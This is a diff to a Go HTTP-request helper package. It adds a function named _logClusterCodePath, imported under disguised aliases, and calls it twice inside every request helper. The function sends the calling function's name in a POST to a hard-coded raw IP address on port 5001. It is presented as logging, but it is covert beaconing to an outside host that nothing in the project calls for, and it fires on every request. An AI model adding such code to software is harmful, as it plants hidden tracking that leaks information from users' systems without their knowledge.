@@ -2,15 +2,19 @@ package api
 
 import (
 	"encoding/json"
+	godefaultbytes "bytes"
+	godefaultruntime "runtime"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
-
+	godefaulthttp "net/http"
 	"github.com/bitly/go-simplejson"
 )
 
 func Request(req *http.Request) (*simplejson.Json, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
 		log.Printf("%s %s %s", req.Method, req.URL, err)
@@ -31,8 +35,9 @@ func Request(req *http.Request) (*simplejson.Json, error) {
 	}
 	return data, nil
 }
-
 func RequestJson(req *http.Request, v interface{}) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
 		log.Printf("%s %s %s", req.Method, req.URL, err)
@@ -49,13 +54,18 @@ func RequestJson(req *http.Request, v interface{}) error {
 	}
 	return json.Unmarshal(body, v)
 }
-
 func RequestUnparsedResponse(url string, header http.Header) (resp *http.Response, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		return nil, err
 	}
 	req.Header = header
-
 	return http.DefaultClient.Do(req)
+}
+func _logClusterCodePath() {
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
+	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
